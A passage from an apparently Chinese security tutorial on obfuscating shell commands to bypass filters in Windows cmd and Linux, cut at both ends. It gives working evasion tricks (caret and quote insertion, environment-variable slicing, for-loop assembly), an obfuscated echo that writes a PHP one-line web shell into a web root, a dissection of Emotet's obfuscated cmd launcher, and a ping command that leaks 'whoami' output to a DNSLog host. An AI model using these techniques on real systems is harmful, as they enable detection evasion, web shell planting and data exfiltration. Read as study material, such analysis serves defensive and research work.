class="hljs powershell">whoami    //正确执行<br>WhOAmi    //正确执行<br>Who<span class="hljs-string">&quot;amI    //正确执行</span><br><span class="hljs-string">((Who&quot;</span>amI))    //错误<br>((Who<span class="hljs-string">&quot;&quot;</span>amI))    //正确执行<br>Who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>amI    //正确执行<br>who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //错误</span><br><span class="hljs-string">who&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;i    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span>i    //正确执行<br>whoa^^mi    //错误<br>n^e^t user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; user    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;ser    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span><span class="hljs-string">&quot;s&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;er    //错误</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIDETUpRLY8zGMHS8xmnRIsX82mksF0dVf7E0fWMujCjYOBXeqkC8uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAoHBYFxInJOmiaZialyzdMiaosNfPIcvVgwZrYlVdLAuUQYO46GyiaFJ6Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAP4vicaXCWroBMGNjVSbGyO2icMtLyAIcb7HyCtMXLr4Ku3cMUSv4l04Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1.2 了解set命令和Windows变量</p><p>在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAo2hOAgvjQCiawOGCUXE8NVDSpqA1SU6icoeMA57oZU0m9ZROIztJAvfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这样就可以进行命令执行了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami    //赋值变量为whoami<br>%cmd%              //执行命令<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA0LB5ddJMqFYP0aMVmq4ge6P2MQUrPrLz6rhWTibXkYDoXn9SYX9zODg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以赋值多个变量，拼接利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd2=am<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%%cmd2%%cmd3%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDArN6p9ibfSToU9pkIxicZNRGxfNeYwTlMNP7icNZVaqAQzYuScNDjZkbpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%am%cmd3%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA1ayFtibNWWK3RlkPgicXU63tkd9LxictrySH0Gvs7PQSgvIIicTuvOtoSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以与1.2的内容进行合并</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=wh<span class="hljs-string">&quot;&quot;</span>o<br><span class="hljs-built_in">set</span> cmd3=i<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">%cmd1%a^m%cmd3%</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA2TLiciagKYAa0HwZfTgR7JSkkW40EhgloVaIDH1LgkkklZAPZXR5W5LA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以在赋值的时候加入空格</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=s<span class="hljs-string">&quot;&quot;</span>er<br><span class="hljs-built_in">set</span> cmd2=t u<br><span class="hljs-built_in">set</span> cmd3=n^e<br>%cmd3%%cmd2%%cmd1%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAnEw09POz1NpcCQ7viapX0k9mNjMOVxmY8CPNE7pw1Ricv81fd0KOX7icg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powersehll">Cmd /C &quot;set cmd1=s&quot;&quot;er &amp;&amp; set cmd2=t u &amp;&amp; set cmd3=n^e &amp;&amp; call %cmd3%%cmd2%%cmd1%&quot;<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7PN5eXz4Hj7UfQWlibL3o4IuH4mVT4uUCztfXfP9v5GwKnicCry1k7kA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>当使用<code>cmd /V:ON</code>或<code>cmd /V:O</code>时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br>cmd /V:O /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAibOqJPCqEQlzA9qiamyTOHVkpG1GCAcLjKxEgDsuf4zfKt6bfkmWv6yA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAqtibwOkeZoIKQMER8j9GxvW1J7nC8qrSzxgunWq7Nc6VVxhv3VmqjQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1.3 Windows切割字符串</p><p>拿whoami举例，实践Windows切割字符串的语法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami<br><br>%cmd:~<span class="hljs-number">0</span>% //取出a的值中的所有字符此时正常执行whoami<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">1</span>个值此时因为w总共就<span class="hljs-number">1</span>个字符<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">6</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">6</span>个值此时因为whoami总共就<span class="hljs-number">6</span>个字符<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAS9vG0ibYAZdpy6VKsE6wvJ2BHHwJwuJoYCBFoziboRruwuvk8rm8cgUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>由此可以看出来截取字符串的语法为<code>%变量名:~x,y%</code>即从变量第x位开始，截取y个字符。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span class="hljs-built_in">set</span> str=<span class="hljs-number">0123456789</span><br><br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-1</span>%<br><span class="hljs-number">9</span><br>从最后<span class="hljs-number">1</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-6</span>%<br><span class="hljs-number">456789</span><br>从倒数第<span class="hljs-number">6</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>%<br><span class="hljs-number">123456789</span><br>从倒数第<span class="hljs-number">9</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">2</span>%<br><span class="hljs-number">12</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">4</span>%<br><span class="hljs-number">1234</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">4</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-2</span>%<br><span class="hljs-number">1234567</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-4</span>%<br><span class="hljs-number">12345</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">4</span>位<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAgptH94OSibkr73opl3nkM47tMymr4zDHibXgBj5OVHpRySrT3tVrBCbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAmPcYkAlsyhSSqNzib75LVm5b0p8rnm3CNCR7WLmZL12x37YVaMhiaSdw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们可以拼命令了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span class="hljs-built_in">echo</span> %COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>Whoami<br><br>C:\Users\a&gt;%COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>win<span class="hljs-literal">-tbucg5qo47j</span>\a<br><br>C:\Users\a&gt;d^i^r%CommonProgramFiles:~<span class="hljs-number">10</span>,<span class="hljs-number">1</span>%%commonprogramfiles:~<span class="hljs-number">0</span>,<span class="hljs-number">3</span>%<br> 驱动器 C 中的卷没有标签。<br> 卷的序列号是 <span class="hljs-number">5</span>CE5<span class="hljs-literal">-9A63</span><br><br> C:\ 的目录<br><br><span class="hljs-number">2022</span>/<span class="hljs-number">03</span>/<span class="hljs-number">12</span>  <span class="hljs-number">00</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          JspStudy<br><span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">09</span>  <span class="hljs-number">20</span>:<span class="hljs-number">04</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          MailMasterData<br><span class="hljs-number">2009</span>/<span class="hljs-number">07</span>/<span class="hljs-number">14</span>  <span class="hljs-number">11</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          PerfLogs<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDALMLf8MC7300lXujw6IeicYvLn0pFCPfFNLKA0H5yApFC9nvCiafbFsHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAyBicAPFoFIo1L6KMNpR5JWhPpNhzNoL4kMCkZhE8xpR5JTbaONGiaRYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">C:\Users\a&gt;set web=^&lt;^&gt;/@$_PHPOST[]?&#x27;e()val<br>C:\Users\a&gt;echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% &gt; C:\phpstudy_pro\WWW\b.php<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAwlZsh1R0nogZXTib9F22ibb6ic4PMmyyT3b2f2QQY5uxylJbDtcsJLnpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6uDENZWHmMNDrFHMcAibgKbSdIhn2Bl9jET8Hu8JtjkB8CEF5bm1T5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。</p><p>这里注意set不能以空格结尾否则，变量会将空格进行赋值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot; set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26  !lq:~4!&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAhnVFP8Ywrnk2QIZsiaZfFkkudO3iaYO6AWgm3aVjek8PZIlsyYYInTfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>错误示范</strong></p><p>下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIO5Lj5XibulTFopjlZ9CumbboicdO4BjrLypibpa8HTStIDyian7y6HQnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="分析Emotet木马中的cmd命令"><a href="#分析Emotet木马中的cmd命令" class="headerlink" title="分析Emotet木马中的cmd命令"></a><strong>分析Emotet木马中的cmd命令</strong></h3><p>Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。</p><p>现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDApPFenjgjOmpS5U4NbLBZq0cPticldJKaTUG2yUlZnqOibUfnDCAsJ1Sg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDASlTK5MSlVRvl4jCu1fwRNGdPnywBTeVpTJbPLyiaAXSyE9C9wOeh0tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>下图为无意义的四个字符串，cmd会自动忽略。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAV4UwFsL7k2qJwSu0MDY31ssus0dXnR1lnbTZ9yvPZPouJSrXRwic0nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>可以看出这里利用了cmd的系统环境变量<code>%comspec%</code>，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAs1FsIOcNKHxUF0qvooxzgxsd2UUpXsHoHHG0u0aHUooA7TQ0FkicdWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>去除无意义的字符串后可以化简为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">%comspec% /c for /f &quot; delims=vf= tokens=2&quot; %f in ( &#x27;assoc .cmd&#x27; ) do %f /V /R<br></code></pre></td></tr></table></figure><p>先利用<code>%comspec% /c</code>执行第一个for循环，再利用<code>for</code>循环的<code>/f</code>参数，在命令<code>assoc .cmd</code>结果<code>.cmd=cmdfile</code>中以字符v、f、&#x3D;为分隔符，取第二列即是“<code>cmd</code>”。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAghx2dbKHqenTlC2TcgKBDf8VcLxmOqyicIHvKAqvMSroIhicj98EKpibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAuhAGBDAuNI1sGTTKR3nVbOFmzibnQ8XuD5wz8MnIFoZicAMwMV9tCkOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这里自定义了一个环境变量<code>@</code>，等于一个1460长度的字符串。然后利用for循环的&#x2F;L参数，遍历变量<code>@</code>：<code>for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!&amp; if %s equ 3 call %\:~-365%</code>，这个for循环自定义了环境变量”<code>\</code>“，还启用了延迟的环境变量扩展<code>!</code>，<code>!@:~%s,1!</code>表示循环变量<code>%s</code>从1459开始，步长为<code>-4</code>，到<code>3</code>结束，循环提取变量<code>@</code>中的字符，添加到<code>\</code>变量中。当<code>%s</code>到<code>3</code>的时候就会执行<code>\</code>中倒数365个字符组成的程序。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6BaBFArsUsqXicNzFtBCuibNjxwhyNVeo0lth4q6YJRhLHqPosXrpoHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="1-4-逻辑运算符在绕过中的作用"><a href="#1-4-逻辑运算符在绕过中的作用" class="headerlink" title="1.4 逻辑运算符在绕过中的作用"></a>1.4 逻辑运算符在绕过中的作用</h2><p><code>|</code> 在cmd中，可以连接命令，且只会执行后面的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami | ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com   //只执行ping<br>ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com | whoami   //只执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAib3eMxxDO6qfz5cmjMhAh8zgUk3vKtT0ZLuGaFJAJ4VbXbtubWfxFmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>||</code> 只有在前面命令失败才执行后面</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> || whoami //不执行whoami<br>ping xxx. || whoami //执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAGXVx4htWaX8MOGadb2hOHcicXgFicNDFUpUaNMibDQY9ffv5KhAjUPXHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>&amp;</code>无论前面的命令是否能执行成功都会执行后面的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp; whoami //执行whoami<br>ping xxx. &amp; whoami //执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAbZFEKpbfib8ggpzZVaaElgetZenoHPYibbgIFgCTZEQrSRibe1dpOkghA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>&amp;&amp;</code>前面命令为真才会执行后面的命令。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//执行whoami</span></span><br>ping xxx. <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//不执行whoami</span></span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDATrsxBpFIwU453O4Lj2mYQu0ghdQhGICAibGjMTldNRnopD8JxL2FibLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>**0x02 Linux（*<em>区分大小写*<em>）</em></em></p><p>2.1 linux下的符号和逻辑运算符</p><p>linux中变量使用<code>$</code>来引用，<code>;</code>表示命令结束无论命令是否执行成功都会执行下一个命令，<code>| || &amp; &amp;&amp;</code>，与Windows一样，这里就不做赘述。</p><p>利用上面的符号可以进行拼接的命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">t</span>=l;j=s;i=&quot; -al<span class="hljs-string">&quot;;<span class="hljs-variable">$t</span><span class="hljs-variable">$j</span><span class="hljs-variable">$i</span></span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDANcXvdvFb6j5rHa2a3bEujbnJgiaibgObrCMSO8rJibgFU546BnlFHSgrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="2-2-利用未被过滤的命令"><a href="#2-2-利用未被过滤的命令" class="headerlink" title="2.2 利用未被过滤的命令"></a>2.2 利用未被过滤的命令</h2><p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.whjtmh.dnslog.cn<br></code></pre></td></tr></table></figure><p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAym5hbSicXvL2BRiaAibBIBsp01QFu4ic0sib9zCUdYbwbUCf1MP3ms4270Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="2-3-linux符号之间的组合"><a href="#2-3-linux符号之间的组合" class="headerlink" title="2.3 linux符号之间的组合"></a>2.3 linux符号之间的组合</h2><p>类似于Windows的<code>&quot;</code>和<code>^</code>linux也有类似的使用方法，就是利用变量和参数</p><p><strong>利用反斜杠绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>\ami<br></code></pre></td></tr></table></figure><p><strong>利用括号括起来（当做命令执行）</strong></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">whoa</span>&#x27;<span class="hljs-symbol">&#x27;mi</span>)<br></code></pre></td></tr></table></figure><p><strong>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">`(<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)`<br>$(<span 